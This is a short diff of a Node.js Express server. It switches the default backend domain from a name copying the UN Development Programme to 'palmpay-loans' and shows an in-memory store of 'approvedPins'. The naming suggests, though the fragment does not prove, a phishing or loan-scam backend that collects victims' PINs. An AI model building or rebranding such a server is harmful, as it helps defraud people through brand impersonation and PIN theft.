@@ -6,7 +6,7 @@ const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const DOMAIN = process.env.BACKEND_DOMAIN || 'https://united-nation-development-program.onrender.com';
+const DOMAIN = process.env.BACKEND_DOMAIN || 'https://palmpay-loans.onrender.com';
 
 // ---------------- MEMORY STORES ----------------
 const approvedPins = {};
